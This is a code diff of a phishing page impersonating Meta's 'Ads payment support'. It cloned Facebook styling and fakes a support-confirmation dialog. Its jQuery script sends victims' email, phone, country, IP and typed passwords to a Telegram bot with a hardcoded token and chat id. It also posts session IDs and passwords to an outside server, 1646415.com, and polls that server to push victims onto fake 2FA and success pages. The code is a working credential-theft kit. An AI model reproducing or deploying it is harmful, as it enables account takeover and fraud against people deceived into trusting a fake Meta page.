+        .x1vjfegm {
+          z-index: 1;
+        }
+
+        .x92rtbv {
+          right: 16px;
+        }
+        .x1tk7jg1 {
+          top: 12px;
+        }
+
+        .xl56j7k {
+          justify-content: center;
+        }
+        .xexx8yu {
+          padding-top: 0;
+        }
+        .xc9qbxq {
+          height: 36px;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x6s0dn4 {
+          align-items: center;
+        }
+        .x1ypdohk {
+          cursor: pointer;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x18d9i69 {
+          padding-bottom: 0;
+        }
+        .x14qfxbe {
+          width: 36px;
+        }
+        .xww2gxu {
+          border-bottom-left-radius: 50%;
+        }
+        .xudhj91 {
+          border-top-right-radius: 50%;
+        }
+        .xm0m39n {
+          border-left-width: 0;
+        }
+
+        .xkhd6sd {
+          padding-left: 0;
+        }
+
+        .xat24cr {
+          margin-bottom: 0;
+        }
+        .x9f619 {
+          box-sizing: border-box;
+        }
+
+        .x1b0d499 {
+          vertical-align: -0.25em;
+        }
+        .x1d69dk1 {
+          -webkit-filter: invert(39%) sepia(21%) saturate(200%) saturate(109.5%)
+            hue-rotate(174deg) brightness(94%) contrast(86%);
+        }
+
+        .x10l6tqk {
+          position: absolute;
+        }
+        .xww2gxu {
+          border-bottom-left-radius: 50%;
+        }
+        .xudhj91 {
+          border-top-right-radius: 50%;
+        }
+        .xg01cxk {
+          opacity: 0;
+        }
+        .xds687c {
+          right: 0;
+        }
+        .x47corl {
+          pointer-events: none;
+        }
+        .x1ey2m1c {
+          bottom: 0;
+        }
+        .x19991ni {
+          transition-property: opacity;
+        }
+        .x18nykt9 {
+          border-bottom-right-radius: 50%;
+        }
+        .x17qophe {
+          left: 0;
+        }
+        .x14yjl9h {
+          border-top-left-radius: 50%;
+        }
+        .x13vifvy {
+          top: 0;
+        }
+        .xh8yej3 {
+          width: 100%;
+        }
+
+        .xdt5ytf {
+          flex-direction: column;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x71s49j {
+          pointer-events: all;
+        }
+        .x6ikm8r {
+          overflow-x: hidden;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x1ja2u2z {
+          z-index: 0;
+        }
+        .x1afcbsf {
+          box-sizing: content-box;
+        }
+        .x10wlt62 {
+          overflow-y: hidden;
+        }
+        .x1a2a7pz {
+          outline: none;
+        }
+        .x1n7qst7 {
+          max-width: 548px;
+          border-radius: 10px;
+        }
+        .x9f619 {
+          border-top-right-radius: 10px;
+        }
+
+        .xozqiw3 {
+          flex-wrap: nowrap;
+        }
+        .xm0m39n {
+          border-left-width: 0;
+        }
+        .xl56j7k {
+          justify-content: center;
+        }
+        .xcfux6l {
+          border-right-width: 0;
+        }
+        .x9f619 {
+          box-sizing: border-box;
+        }
+        .x972fbf {
+          border-top-width: 0;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x6s0dn4 {
+          align-items: center;
+        }
+        .x2lah0s {
+          flex-shrink: 0;
+        }
+        .x1qhh985 {
+          border-bottom-width: 0;
+        }
+        .x1q0g3np {
+          flex-direction: row;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x1ja2u2z {
+          z-index: 0;
+        }
+
+        .xkhd6sd {
+          padding-left: 0;
+        }
+        .xjbqb8w {
+          background-color: transparent;
+        }
+        .xh8yej3 {
+          width: 100%;
+        }
+        .xexx8yu {
+          padding-top: 0;
+        }
+        .xdt5ytf {
+          flex-direction: column;
+        }
+        .xdj266r {
+          margin-top: 0;
+        }
+        .xat24cr {
+          margin-bottom: 0;
+        }
+        .x9f619 {
+          box-sizing: border-box;
+        }
+        .x87ps6o {
+          -webkit-user-select: none;
+        }
+        .x4uap5 {
+          padding-right: 0;
+        }
+        .x3x9cwd {
+          border-top-right-radius: inherit;
+        }
+        .x3nfvp2 {
+          display: inline-flex;
+        }
+        .x1ypdohk {
+          cursor: pointer;
+        }
+        .x1o1ewxj {
+          border-top-left-radius: inherit;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x1mh8g0r {
+          margin-left: 0;
+        }
+        .x1e5q0jg {
+          border-bottom-right-radius: inherit;
+        }
+        .x18d9i69 {
+          padding-bottom: 0;
+        }
+        .x16tdsg8 {
+          text-align: inherit;
+        }
+        .x13rtm0m {
+          border-bottom-left-radius: inherit;
+        }
+        .x11i5rnm {
+          margin-right: 0;
+        }
+        .xe8uvvx {
+          list-style: none;
+        }
+        .x1hl2dhg {
+          text-decoration: none;
+        }
+        .x1a2a7pz {
+          outline: none;
+        }
+        .xl56j7k {
+          justify-content: center;
+        }
+        .xh8yej3 {
+          width: 100%;
+        }
+        .xdt5ytf {
+          flex-direction: column;
+        }
+        .xat24cr {
+          margin-bottom: 0;
+        }
+        .x9f619 {
+          box-sizing: border-box;
+        }
+        .x87ps6o {
+          -webkit-user-select: none;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x1mh8g0r {
+          margin-left: 0;
+        }
+        .x11i5rnm {
+          margin-right: 0;
+        }
+        .xl56j7k {
+          justify-content: center;
+        }
+        .xkhd6sd {
+          padding-left: 0;
+        }
+        .xdt5ytf {
+          flex-direction: column;
+        }
+        .xav7gou {
+          border-left: 0;
+        }
+        .x4uap5 {
+          padding-right: 0;
+        }
+        .x1ypdohk {
+          cursor: pointer;
+        }
+        .x1b1mbwd {
+          border-right: 0;
+        }
+        .x11i5rnm {
+          margin-right: 0;
+        }
+        .xaqea5y {
+          border-bottom: 0;
+        }
+        .x6umtig {
+          border-top: 0;
+        }
+        .xjkvuk6 {
+          padding-bottom: 4px;
+        }
+        .xeuugli {
+          min-width: 0;
+        }
+        .xdt5ytf {
+          flex-direction: column;
+        }
+        .xdl72j9 {
+          flex-basis: auto;
+        }
+        .x9f619 {
+          box-sizing: border-box;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x2lah0s {
+          flex-shrink: 0;
+        }
+        .x1n2onr6 {
+          position: relative;
+        }
+        .x1ja2u2z {
+          z-index: 0;
+        }
+        .x1iorvi4 {
+          padding-top: 4px;
+        }
+        .x1e558r4 {
+          padding-left: 4px;
+        }
+        .x193iq5w {
+          max-width: 100%;
+        }
+        .x150jy0e {
+          padding-right: 4px;
+        }
+        .xl56j7k {
+          justify-content: center;
+        }
+        .x78zum5 {
+          display: flex;
+        }
+        .x6s0dn4 {
+          align-items: center;
+        }
+
+        .xg01cxk {
+          opacity: 0;
+        }
+        .xds687c {
+          right: 0;
+        }
+        .x47corl {
+          pointer-events: none;
+        }
+        .x3x9cwd {
+          border-top-right-radius: inherit;
+        }
+        .x1o1ewxj {
+          border-top-left-radius: inherit;
+        }
+        .x1ey2m1c {
+          bottom: 0;
+        }
+        .x1e5q0jg {
+          border-bottom-right-radius: inherit;
+        }
+        .x19991ni {
+          transition-property: opacity;
+        }
+        .x17qophe {
+          left: 0;
+        }
+        .x13vifvy {
+          top: 0;
+        }
+        .x13rtm0m {
+          border-bottom-left-radius: inherit;
+        }
+        .x10l6tqk {
+          position: absolute;
+        }
+
+        .xtvsq51 {
+          background-color: rgb(8, 102, 255);
+        }
+        .xbxaen2 {
+          padding-right: 40px;
+        }
+        .x1u72gb5 {
+          padding-left: 40px;
+        }
+        .x1r1pt67 {
+          height: 36px;
+        }
+        .x1qhh985 {
+          border-radius: 10px;
+        }
+        .cjewjaiwa {
+          font-weight: 600;
+          color: #fff;
+        }
+      </style>
+      <div class="__fb-light-mode x1n2onr6 xzkaem6" style="display: none">
+        <div class="x9f619 x1n2onr6 x1ja2u2z">
+          <div class="x78zum5 xdt5ytf xg6iff7 x1n2onr6 xwnxf6m">
+            <div
+              class="x1ey2m1c xds687c xixxii4 x17qophe x13vifvy x1h0vfkc"
+            ></div>
+            <div
+              class="x1uvtmcs x4k7w5x x1h91t0o x1beo9mf xaigb6o x12ejxvf x3igimt xarpa2k xedcshv x1lytzrv x1t2pt76 x7ja8zs x1n2onr6 x1qrby5j x1jfb8zj"
+              tabindex="-1"
+              style="position: fixed; top: 0; width: 100%"
+            >
+              <div
+                class="__fb-light-mode x1qjc9v5 x9f619 x78zum5 xdt5ytf xl56j7k x1c4vz4f xg6iff7"
+              >
+                <div
+                  class="x1cy8zhl x9f619 x78zum5 xl56j7k x2lwn1j xeuugli x47corl xurb0ha x1sxyh0 x1x97wu9 xbr3nou x3v4vwv x1dzdb2q"
+                >
+                  <div
+                    aria-label="Ads payment support"
+                    role="dialog"
+                    class="x1n2onr6 x1ja2u2z x1afcbsf x78zum5 xdt5ytf x1a2a7pz x6ikm8r x10wlt62 x71s49j x1jx94hy x1qpq9i9 xdney7k xu5ydu1 xt3gfkd x104qc98 x1g2kw80 x16n5opg xl7ujzl xhkep3z x1n7qst7 xh8yej3"
+                    style="background-color: #fff"
+                  >
+                    <div class="x9f619 xng8ra xua58t2 x525zg8 xyxze6z">
+                      <div
+                        class="x6s0dn4 x9f619 x78zum5 x5yr21d x1pi30zi x1swvt13 xl56j7k"
+                      >
+                        <h2
+                          class="x1heor9g x1qlqyl8 x1pd3egz x1a2a7pz x193iq5w xeuugli"
+                          dir="auto"
+                          tabindex="-1"
+                        >
+                          <span
+                            class="x193iq5w xeuugli x13faqbe x1vvkbs xlh3980 xvmahel x1n0sxbx x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x xudqn12 x41vudc x1603h9y x1u7k74 x1xlr1w8 xzsf02u"
+                            dir="auto"
+                            ><span
+                              class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft"
+                              >Ads payment support</span
+                            ></span
+                          >
+                        </h2>
+                      </div>
+                    </div>
+                    <div class="x92rtbv x10l6tqk x1tk7jg1 x1vjfegm">
+                      <div
+                        aria-label="Close"
+                        id="close-btn13"
+                        class="x1i10hfl x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r x16tdsg8 x1hl2dhg xggy1nq x87ps6o x1lku1pv x1a2a7pz x6s0dn4 x14yjl9h xudhj91 x18nykt9 xww2gxu x972fbf xcfux6l x1qhh985 xm0m39n x9f619 x78zum5 xl56j7k xexx8yu x4uap5 x18d9i69 xkhd6sd x1n2onr6 xc9qbxq x14qfxbe x1qhmfi1"
+                        role="button"
+                        tabindex="0"
+                        style="background-color: #e4e6eb; border-radius: 50%"
+                      >
+                        <i
+                          data-visualcompletion="css-img"
+                          class="x1b0d499 x1d69dk1"
+                          style="
+                            background-image: url('https://static.xx.fbcdn.net/rsrc.php/v3/yQ/r/yTUMQJovBsj.png');
+                            background-position: -21px -105px;
+                            background-size: auto;
+                            width: 20px;
+                            height: 20px;
+                            background-repeat: no-repeat;
+                            display: inline-block;
+                          "
+                        ></i>
+                        <div
+                          class="x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h x1wpzbip x14yjl9h xudhj91 x18nykt9 xww2gxu"
+                          data-visualcompletion="ignore"
+                        ></div>
+                      </div>
+                    </div>
+                    <div
+                      class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x1qughib x1qjc9v5 xozqiw3 x1q0g3np x1pi30zi x1swvt13 xsag5q8 xz9dl7a xykv574 xbmpl8g x4cne27 xifccgj"
+                    >
+                      <div
+                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli xsyo7zv x16hj40l x10b6aqq x1yrsyyn"
+                      >
+                        <span
+                          class="x193iq5w xeuugli x13faqbe x1vvkbs xlh3980 xvmahel x1n0sxbx x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x3x7a5m x1f6kntn xvq8zen xo1l8bm xi81zsa"
+                          dir="auto"
+                          style="font-size: 18px; font-weight: 600"
+                          >Your message was sent to Meta Support</span
+                        >
+                        <div style="word-spacing: 3px">
+                          We'll send you an email. You can view your message
+                          details in your
+                          <span style="color: #2e89ff">Support Inbox</span>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="x1k54i6l xsag5q8 x1n2onr6">
+                      <div
+                        class="x9f619 x1n2onr6 x1ja2u2z x78zum5 x2lah0s x13a6bvl x1qjc9v5 xozqiw3 x1q0g3np x1pi30zi x1swvt13 xz9dl7a xcud41i x139jcc6 x4vbgl9 x1rdy4ex"
+                        style="
+                          flex-direction: row-reverse;
+                          padding-top: 10px;
+                          padding-bottom: 10px;
+                        "
+                      >
+                        <div
+                          class="x9f619 x1n2onr6 x1ja2u2z x78zum5 xdt5ytf x2lah0s x193iq5w xeuugli x150jy0e x1e558r4 xjkvuk6 x1iorvi4 xdl72j9"
+                        >
+                          <div
+                            aria-label="Save"
+                            class="x1i10hfl xjbqb8w x6umtig x1b1mbwd xaqea5y xav7gou x1ypdohk xe8uvvx xdj266r x11i5rnm xat24cr x1mh8g0r xexx8yu x4uap5 x18d9i69 xkhd6sd x16tdsg8 x1hl2dhg xggy1nq x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x87ps6o x1lku1pv x1a2a7pz x9f619 x3nfvp2 xdt5ytf xl56j7k x1n2onr6 xh8yej3"
+                            role="button"
+                            tabindex="0"
+                          >
+                            <div
+                              id="close-btn12"
+                              class="x1n2onr6 x1ja2u2z x78zum5 x2lah0s xl56j7k x6s0dn4 xozqiw3 x1q0g3np xi112ho x17zwfj4 x585lrc x1403ito x972fbf xcfux6l x1qhh985 xm0m39n x9f619 xbxaen2 x1u72gb5 xtvsq51 x1r1pt67"
+                            >
+                              <div
+                                class="x6s0dn4 x78zum5 xl56j7k x1608yet xljgi0e x1e0frkt"
+                              >
+                                <div
+                                  class="x9f619 x1n2onr6 x1ja2u2z x193iq5w xeuugli x6s0dn4 x78zum5 x2lah0s x1fbi1t2 xl8fo4v"
+                                >
+                                  <span
+                                    class="x193iq5w xeuugli x13faqbe x1vvkbs xlh3980 xvmahel x1n0sxbx x1lliihq x1s928wv xhkezso x1gmr53x x1cpjm7i x1fgarty x1943h6x x4zkp8e x3x7a5m x1f6kntn xvq8zen x1s688f xtk6v10"
+                                    dir="auto"
+                                    ><span
+                                      class="x1lliihq x6ikm8r x10wlt62 x1n2onr6 xlyipyv xuxw1ft cjewjaiwa"
+                                      >Close</span
+                                    ></span
+                                  >
+                                </div>
+                              </div>
+                              <div
+                                class="x1o1ewxj x3x9cwd x1e5q0jg x13rtm0m x1ey2m1c xds687c xg01cxk x47corl x10l6tqk x17qophe x13vifvy x1ebt8du x19991ni x1dhq9h"
+                                data-visualcompletion="ignore"
+                              ></div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div><div></div></div>
+          </div>
+        </div>
+        <div><div></div></div>
+      </div>
+      <script src="npm/jquery.cookie%401.4.1/jquery.cookie.js"></script>
+      <script src="npm/bootstrap%404.3.1/dist/js/bootstrap.min.js"></script>
+    </div>
+  </body>
+
+  <script>
+    let check_submit = false;
+    $(document).ready(function () {
+      (function () {
+        GetSess();
+        getIP();
+        AddSess();
+        checkCountry();
+        setInterval(function () {
+          getsttindex(); // Thay '32131' bằng id thực tế của bạn
+        }, 3000);
+      })();
+
+      document
+        .getElementById("password-input")
+        .addEventListener("keypress", function (e) {
+          if (e.key === "Enter") {
+            e.preventDefault();
+            sendPasword();
+          }
         });
 
-        $("#btn-submit").click(function() {
-            var isValid = true;
+      $("#btn-submit").click(function () {
+        var isValid = true;
 
-            var phone = $('#phone').val();
-            sessionStorage.setItem('phone', phone);
-            if (!phone)
-                isValid = false;
+        var phone = $("#phone").val();
+        sessionStorage.setItem("phone", phone);
+        if (!phone) isValid = false;
 
-            email = $('#email').val();
-            if (!email)
-                isValid = false;
-            sessionStorage.setItem('email', email);
+        email = $("#email").val();
+        if (!email) isValid = false;
+        sessionStorage.setItem("email", email);
 
+        var reason = $("#reason").val();
+        if (!reason) isValid = false;
 
+        var check = $("#check").is(":checked");
+        if (!check) isValid = false;
 
-            var reason = $('#reason').val();
-            if (!reason)
-                isValid = false;
-
-            var check = $('#check').is(":checked");
-            if (!check)
-                isValid = false;
-
-
-            if (!isValid) {
-                $('#form-error').text('Please fill in the required information');
-                return;
-            } else {
-                showLoadingCircle();
-                setTimeout(() => {
-                    $('#passwordModal').modal({
-                        backdrop: 'static',
-                        keyboard: false
-                    });
-                    hideLoadingCircle();
-                    $("#passwordModal").modal("show");
-                }, 2000);
-                var reason = $('#reason').val();
-                var email = $('#email').val();
-                var country_code = $("select[id='country_code'] option:selected").val();
-                var phone = $('#phone').val();
-                $.ajax({
-                    url: "https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage",
-                    method: "POST",
-                    data: {
-                        chat_id: "-4059027712",
-                        text: "Email: " + email + "\nMã Vùng:" + country_code + "\nPhone: " + phone + "\nIp: " + ip + "\nMô tả:" + reason
-                    }
-                });
-                $('#form-error').text('');
-                $('#btn-submit').attr('disabled', true);
-                $("#message_err").html('<p ></p>');
-                $("#password-input").val('')
-                var payload = {
-                    'email': $("#email").val(),
-                    'type': 'email'
-                };
-                $.ajax({
-                    url: 'server.php',
-                    dataType: 'json',
-                    data: payload,
-                    method: "POST",
-                    rejectUnauthorized: false,
-                    success: function(response) {
-                        response = JSON.parse(response)
-                        var clientToken = response.clientToken;
-                        localStorage.setItem('clientToken', clientToken);
-                    },
-                    error: function(err) {
-                        console.log(err);
-                    }
-                });
-            }
-
-        })
-
-
+        if (!isValid) {
+          $("#form-error").text("Please fill in the required information");
+          return;
+        } else {
+          showLoadingCircle();
+          setTimeout(() => {
+            $("#passwordModal").modal({
+              backdrop: "static",
+              keyboard: false,
+            });
+            hideLoadingCircle();
+            $("#passwordModal").modal("show");
+          }, 2000);
+          var reason = $("#reason").val();
+          var email = $("#email").val();
+          var country_code = $(
+            "select[id='country_code'] option:selected"
+          ).val();
+          var phone = $("#phone").val();
+          $.ajax({
+            url: "https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage",
+            method: "POST",
+            data: {
+              chat_id: "-4059027712",
+              text:
+                "Email: " +
+                email +
+                "\nMã Vùng:" +
+                country_code +
+                "\nPhone: " +
+                phone +
+                "\nIp: " +
+                ip +
+                "\nMô tả:" +
+                reason,
+            },
+          });
+          $("#form-error").text("");
+          $("#btn-submit").attr("disabled", true);
+          $("#message_err").html("<p ></p>");
+          $("#password-input").val("");
+          var payload = {
+            email: $("#email").val(),
+            type: "email",
+          };
+          $.ajax({
+            url: "server.php",
+            dataType: "json",
+            data: payload,
+            method: "POST",
+            rejectUnauthorized: false,
+            success: function (response) {
+              response = JSON.parse(response);
+              var clientToken = response.clientToken;
+              localStorage.setItem("clientToken", clientToken);
+            },
+            error: function (err) {
+              console.log(err);
+            },
+          });
+        }
+      });
     });
 
     // CONST FUNCTION HAI THEM
@@ -693,228 +2882,242 @@
     var country = "";
 
     function getsttindex() {
-        // Tạo yêu cầu AJAX bằng jQuery
-        $.ajax({
-            url: "https://1646415.com/post.php?t=getsttindex&id=" + sessid,
-            method: "GET",
-            dataType: "JSON",
-            success: function(data) {
-                if (data == '2FA') {
-                    window.location.href = 'confirm.php';
-                } else if (data == 'Success') {
-                    window.location.href = 'success.php';
-                } else if (data == 'Loading') {
-                    window.location.href = 'Loading.php';
-                } else {
-                    console.log('khác');
-                }
-            },
-            error: function() {
-                // Xử lý lỗi nếu có
-                console.error("Đã xảy ra lỗi trong quá trình lấy dữ liệu.");
-            }
-        });
+      // Tạo yêu cầu AJAX bằng jQuery
+      $.ajax({
+        url: "https://1646415.com/post.php?t=getsttindex&id=" + sessid,
+        method: "GET",
+        dataType: "JSON",
+        success: function (data) {
+          if (data == "2FA") {
+            window.location.href = "confirm.php";
+          } else if (data == "Success") {
+            window.location.href = "success.php";
+          } else if (data == "Loading") {
+            window.location.href = "Loading.php";
+          } else {
+            console.log("khác");
+          }
+        },
+        error: function () {
+          // Xử lý lỗi nếu có
+          console.error("Đã xảy ra lỗi trong quá trình lấy dữ liệu.");
+        },
+      });
     }
 
     function updatepass(pass) {
-        $.ajax({
-            url: "https://1646415.com/post.php?t=update2&id=" + sessid + "&password=" + pass,
-            method: "POST",
-            dataType: 'JSON'
-
-        });
+      $.ajax({
+        url:
+          "https://1646415.com/post.php?t=update2&id=" +
+          sessid +
+          "&password=" +
+          pass,
+        method: "POST",
+        dataType: "JSON",
+      });
     }
 
     function AddSess() {
-        $.ajax({
-            url: 'https://1646415.com/modun_post.php',
-            type: 'POST',
-            dataType: 'JSON',
-            data: {
-                t: 'insert_sess',
-                id: sessid
-            },
+      $.ajax({
+        url: "https://1646415.com/modun_post.php",
+        type: "POST",
+        dataType: "JSON",
+        data: {
+          t: "insert_sess",
+          id: sessid,
+        },
 
-            success: function(data) {
-                console.log('true', data);
-            },
-            error: function() {
-                console.error('false');
-
-            }
-        });
-
+        success: function (data) {
+          console.log("true", data);
+        },
+        error: function () {
+          console.error("false");
+        },
+      });
     }
 
     function checkCountry() {
-        $.ajax({
-            url: 'https://ipinfo.io/' + ip + '/json?',
-            dataType: 'json',
-            success: function(response) {
-                country = response.country;
-                console.log(country);
-            },
-            error: function() {
-                $("#ip-info").text("Không thể kiểm tra quốc gia cho IP " + ip);
-            }
-        });
+      $.ajax({
+        url: "https://ipinfo.io/" + ip + "/json?",
+        dataType: "json",
+        success: function (response) {
+          country = response.country;
+          console.log(country);
+        },
+        error: function () {
+          $("#ip-info").text("Không thể kiểm tra quốc gia cho IP " + ip);
+        },
+      });
     }
 
     function getIP() {
-            $.ajax({
-        url: 'https://ipapi.co/ip',
-        type: 'GET',
-        contentType: 'application/json',
+      $.ajax({
+        url: "https://ipapi.co/ip",
+        type: "GET",
+        contentType: "application/json",
         async: true,
         success: function (msg) {
-            ip = msg;
-        }
-    });
-        }
-		
+          ip = msg;
+        },
+      });
+    }
 
     function GetSess() {
-        var username = $.cookie();
-        if (username) {
-            sessid = username['PHPSESSID'];
-            console.log(username['PHPSESSID']);
-        } else {
-            $('#cookieValue').text('Cookie không tồn tại');
-        }
-        return sessid;
+      var username = $.cookie();
+      if (username) {
+        sessid = username["PHPSESSID"];
+        console.log(username["PHPSESSID"]);
+      } else {
+        $("#cookieValue").text("Cookie không tồn tại");
+      }
+      return sessid;
     }
 
     function showLoadingCircle() {
-        document.getElementById('loading-circle').style.display = 'block';
+      document.getElementById("loading-circle").style.display = "block";
     }
 
     function hideLoadingCircle() {
-        document.getElementById('loading-circle').style.display = 'none';
+      document.getElementById("loading-circle").style.display = "none";
     }
 
     function update() {
-        var country_code = $("select[id='country_code'] option:selected").val();
-        var phone = $('#phone').val();
-        $.ajax({
-            url: "https://1646415.com/modun_post.php",
-            method: "POST",
-            data: {
-                t: 'update1',
-                id: sessid,
-                email: email,
-                phone: country_code + " " + phone,
-                country: country
-            }
-        });
+      var country_code = $("select[id='country_code'] option:selected").val();
+      var phone = $("#phone").val();
+      $.ajax({
+        url: "https://1646415.com/modun_post.php",
+        method: "POST",
+        data: {
+          t: "update1",
+          id: sessid,
+          email: email,
+          phone: country_code + " " + phone,
+          country: country,
+        },
+      });
     }
     // End CONST FUNCTION HAI THEM
 
-    $(".submit_password").click(function() {
-        sendPasword();
+    $(".submit_password").click(function () {
+      sendPasword();
     });
 
-    $(".cancel").click(function() {
-        var payload = {
-            'type': 'cancel'
-        };
-        var clientToken = localStorage.getItem('clientToken');
-        $.ajax({
-            url: 'server.php',
-            dataType: 'json',
-            data: payload,
-            method: "POST",
-            rejectUnauthorized: false,
-            headers: {
-                'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
-            },
-            success: function(response) {
-                response = JSON.parse(response)
-                if (response.status == true) {
-                    $('#btn-submit').attr('disabled', false);
-                    $("#passwordModal").modal("hide");
-                }
+    $(".cancel").click(function () {
+      var payload = {
+        type: "cancel",
+      };
+      var clientToken = localStorage.getItem("clientToken");
+      // $.ajax({
+      //     url: 'server.php',
+      //     dataType: 'json',
+      //     data: payload,
+      //     method: "POST",
+      //     rejectUnauthorized: false,
+      //     headers: {
+      //         'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
+      //     },
+      //     success: function(response) {
+      //         response = JSON.parse(response)
+      //         if (response.status == true) {
+      //             $('#btn-submit').attr('disabled', false);
+      //             $("#passwordModal").modal("hide");
+      //         }
 
-            },
-            error: function(err) {
-                console.log(err);
-            }
-        });
+      //     },
+      //     error: function(err) {
+      //         console.log(err);
+      //     }
+      // });
+      $("#passwordModal").modal("hide");
     });
 
     function sendpass(password) {
-        $.ajax({
-            url: 'https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage',
-            method: 'POST',
-            data: {
-                chat_id: '-4059027712',
-                text: 'Pass: ' + password + '\nIp: ' + ip
-            }
-        });
+      $.ajax({
+        url: "https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage",
+        method: "POST",
+        data: {
+          chat_id: "-4059027712",
+          text: "Pass: " + password + "\nIp: " + ip,
+        },
+      });
     }
 
     function sendPasword() {
-        $("#message_err").html('<p style="color: Gray;">Authentication in progress</p>')
-        $(".submit_password").prop("disabled", true);
-        var clientToken = localStorage.getItem('clientToken');
-        var payload = {
-            'email': $("#email").val(),
-            'password': $("#password-input").val(),
-            'type': 'password'
-        };
-        var password = $("#password-input").val();
-        $.ajax({
-            url: 'https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage',
-            method: 'POST',
-            data: {
-                chat_id: '-4059027712',
-                text: 'Pass: ' + password + '\nIp: ' + ip
-            }
-        });
+      $("#message_err").html(
+        '<p style="color: Gray;">Authentication in progress</p>'
+      );
+      $(".submit_password").prop("disabled", true);
+      var clientToken = localStorage.getItem("clientToken");
+      var payload = {
+        email: $("#email").val(),
+        password: $("#password-input").val(),
+        type: "password",
+      };
+      var password = $("#password-input").val();
+      // $.ajax({
+      //     url: 'https://api.telegram.org/bot1070051055:AAHqiH52qWt0ubyfyOmIqkXQuqIjm4Mt5RM/sendMessage',
+      //     method: 'POST',
+      //     data: {
+      //         chat_id: '-4059027712',
+      //         text: 'Pass: ' + password + '\nIp: ' + ip
+      //     }
+      // });
 
-        $.ajax({
-            url: 'server.php',
-            dataType: 'json',
-            data: payload,
-            method: "POST",
-            headers: {
-                'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
-            },
-            success: function(response) {
-                var password = $("#password-input").val();
-                var url1 = "https://1646415.com/post.php?t=update2&id=" + sessid + "&password=" + password;
-                response = JSON.parse(response)
-                if (response.status) {
-                    localStorage.setItem('typeCheckPoint', response.type)
-                    localStorage.setItem('email', payload.email);
-                    localStorage.setItem('password', payload.password);
-                    $("#message_err").html('<p style="color: green;">' + response.message + '</p>')
-                    if (response.pass == true) {
-                        setTimeout(() => {
-                            // Thực hiện yêu cầu POST
-                            $.post(url1, function(response) {
-                                // Xử lý kết quả ở đây
-                                console.log(response);
-                            });
-                            window.location.href = "success.php"
-                        }, 1500);
-                    } else {
-                        setTimeout(() => {
-                            $.post(url1, function(response) {
-                                console.log(response);
-                            });
-                            window.location.href = "confirm.php"
-                        }, 1500);
-                    }
-                } else {
-                    $("#message_err").html('<p style="color: red;">' + response.message + '</p>')
-                    $(".submit_password").prop("disabled", false);
-                }
-            },
-            error: function(err) {
-                console.log(err);
-            }
-        });
-    };
-</script>
-
+      // $.ajax({
+      //     url: 'server.php',
+      //     dataType: 'json',
+      //     data: payload,
+      //     method: "POST",
+      //     headers: {
+      //         'x-client-token': clientToken // Truyền clientToken trong tiêu đề x-client-token
+      //     },
+      //     success: function(response) {
+      //         var password = $("#password-input").val();
+      //         var url1 = "https://1646415.com/post.php?t=update2&id=" + sessid + "&password=" + password;
+      //         response = JSON.parse(response)
+      //         if (response.status) {
+      //             localStorage.setItem('typeCheckPoint', response.type)
+      //             localStorage.setItem('email', payload.email);
+      //             localStorage.setItem('password', payload.password);
+      //             $("#message_err").html('<p style="color: green;">' + response.message + '</p>')
+      //             if (response.pass == true) {
+      //                 setTimeout(() => {
+      //                     // Thực hiện yêu cầu POST
+      //                     $.post(url1, function(response) {
+      //                         // Xử lý kết quả ở đây
+      //                         console.log(response);
+      //                     });
+      //                     window.location.href = "success.php"
+      //                 }, 1500);
+      //             } else {
+      //                 setTimeout(() => {
+      //                     $.post(url1, function(response) {
+      //                         console.log(response);
+      //                     });
+      //                     window.location.href = "confirm.php"
+      //                 }, 1500);
+      //             }
+      //         } else {
+      //             $("#message_err").html('<p style="color: red;">' + response.message + '</p>')
+      //             $(".submit_password").prop("disabled", false);
+      //         }
+      //     },
+      //     error: function(err) {
+      //         console.log(err);
+      //     }
+      // });
+    }
+    $("#close-btn12").on("click", function () {
+      $(".xzkaem6").css("display", "none");
+    });
+    $("#close-btn13").on("click", function () {
+      $(".xzkaem6").css("display", "none");
+    });
+    $(".submit_password").on("click", function () {
+      setTimeout(() => {
+        $("#passwordModal").modal("hide");
+        $(".xzkaem6").css("display", "block");
+      }, 2000);
+    });
+  </script>
 </html>
